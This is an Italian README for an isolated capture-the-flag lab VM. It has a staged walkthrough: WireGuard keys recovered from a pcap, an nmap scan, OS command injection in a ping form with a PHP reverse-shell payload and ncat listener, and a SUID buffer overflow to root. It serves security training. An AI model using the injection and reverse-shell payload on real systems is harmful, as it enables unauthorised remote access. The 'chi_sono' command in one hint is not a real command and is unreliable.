<h1 align="center" style="color: #00FF00;">
  >> 05_PROTOCOLLO_DANTE // (Cyber-Security) 🛡️
</h1>

<p align="center">
  <i>Directory di livello 2. Ambiente isolato di addestramento CTF (Capture The Flag). Include analisi traffico di rete, vulnerabilità web e binary exploitation.</i>
</p>

---

## 📋 INVENTARIO RISORSE // (Superficie di Attacco)

Di seguito l'elenco degli elementi chiave del laboratorio. Ogni componente rappresenta un livello progressivo della sfida per raggiungere i privilegi massimi (ROOT).

| Vettore / Directory | Descrizione Operazione | Strumenti Consigliati | Stato |
| :--- | :--- | :--- | :---: |
| 📄 **`cattura_rete.pcap`** | Entry point locale. Intercettazione traffico per recupero chiavi e perimetro VPN. | `Wireshark` | 🟢 Analizzabile |
| 🌐 **`Web App (172.20.0.30)`** | Pannello di diagnostica aziendale vulnerabile a OS Command Injection. | `Browser`, `Nmap`, `Ncat` | 🔴 Compromesso |
| ⚙️ **`dante_core`** (SUID) | Binario C custom vulnerabile a Buffer Overflow. (Scalata privilegi a ROOT) | `GDB`, `Python3` | 🔴 Violabile |

## 🖥️ INFRASTRUTTURA TARGET // (Setup Macchina Virtuale)

<p align="left">
  <img src="https://readme-typing-svg.herokuapp.com?font=Courier+New&weight=600&size=16&pause=1000&color=00FF00&vCenter=true&width=550&lines=>_Connessione_al_Server_Host...;>_Booting_Protocollo_Dante...;>_Infrastruttura_Isolata_Operativa." alt="Terminale Animato" />
</p>

Il bersaglio è confezionato in un'Appliance Virtuale (`.ova`). Il sistema operativo ospite non richiede (e non possiede) credenziali di accesso fisiche: tutti i tentativi di intrusione devono avvenire attraverso la rete simulata.

> ⚠️ **ATTENZIONE // CONFIGURAZIONE RETE (CRITICO):**
> Per garantire che i tunnel VPN e i container Docker interni funzionino correttamente, devi configurare VirtualBox come segue: Imposta la scheda di rete della VM su **Scheda Solo Host (Host-only Adapter)**, imposta la Modalità Promiscua su **Permetti tutto** e assicurati di selezionare *"Includi tutti gli indirizzi MAC delle schede di rete"* durante la fase di importazione.

<br>

<div align="left">
  <a href="https://mega.nz/file/GlZFSQDL#akWAfaKgl3_WkaYYM6cn-FKm4w6uR6ebajSFUHnFiRo" target="_blank">
    <img src="https://img.shields.io/badge/SCARICA_APPLIANCE_OVA-D9272E?style=for-the-badge&logo=mega&logoColor=white&borderColor=D9272E" alt="Download OVA" />
  </a>
</div>

---

## ⚙️ PROTOCOLLO DI INFILTRAZIONE // (Walkthrough & Hints)

Il target assegna automaticamente un indirizzo IP dinamico tramite DHCP (solitamente nel range `192.168.56.x`). Digitalo sulla tua rete *Host-Only* usando `nmap` prima di tentare la connessione VPN.

La sezione sottostante contiene il percorso logico. **Espandi i menu a tendina solo se sei bloccato e hai bisogno di indizi diretti.**

### Fase 1: Analisi PCAP e Accesso al Perimetro
Il file `cattura_rete.pcap` contiene le tracce in chiaro di una sessione VPN dell'amministratore. Individua le chiavi crittografiche.
<details>
<summary>🚩 Espandi per la Soluzione (Chiavi WireGuard)</summary>

Filtra il traffico Wireshark per la porta UDP `51820`. Troverai pacchetti anomali contenenti la **Private Key** e la **Public Key**.
Crea un file di configurazione WireGuard aggiornando il campo `Endpoint` con l'IP della macchina virtuale trovato tramite scansione di rete. Imposta `AllowedIPs = 10.0.0.0/24, 172.20.0.0/24`.
</details>

### Fase 2: Ricognizione Rete Nascosta
Una volta attivato il tunnel VPN, sei dentro la rete aziendale. Mappa l'infrastruttura containerizzata nascosta.
<details>
<summary>🚩 Espandi per la Soluzione (Scansione Servizi)</summary>

Lancia una scansione Nmap sulla sottorete instradata:
```bash
nmap -sV 172.20.0.0/24
```
Scoprirai un servizio Web attivo all'indirizzo `172.20.0.30` (porta 80). Visitalo tramite browser.
</details>

### Fase 3: Command Injection & Reverse Shell (User Flag)
Il pannello di diagnostica web usa un modulo Ping scritto male. Concatena comandi per ingannare il server.
<details>
<summary>🚩 Espandi per la Soluzione (Web Exploit)</summary>

Il campo di testo è vulnerabile. Inserisci `127.0.0.1; chi_sono` (o comandi simili in bash) per eseguire codice. 
Per ottenere l'accesso remoto, apri un listener sul tuo terminale (`ncat -lvnp 4444`) e inietta questo payload nel sito (sostituendo `10.0.0.1` col tuo IP VPN):
```bash
127.0.0.1; php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```
</details>

### Fase 4: Buffer Overflow (Root Flag)
Cerca binari con permessi speciali SUID nel file system. Sovrascrivi la memoria di un eseguibile per saltare a funzioni nascoste.
<details>
<summary>🚩 Espandi per la Soluzione (Binary Pwn)</summary>

Individua i binari SUID: `find / -perm -4000 2>/dev/null`.
Troverai il file `/usr/local/bin/dante_core`. Usando `gdb` o un decompilatore, calcola l'offset necessario a mandare in crash il buffer (`gets()`) e sovrascrivi l'Instruction Pointer (EIP) con l'indirizzo esatto in memoria della funzione `accesso_root()`. Leggi la flag in `/root/sabotaggio.txt`.
</details>

---
<br>
<div align="center">
  <a href="../README.md"><img src="https://img.shields.io/badge/TORNA_AL_SISTEMA_CENTRALE-000000?style=for-the-badge&logo=gnu-bash&logoColor=00FF00&borderColor=00FF00" alt="Back" /></a>
</div>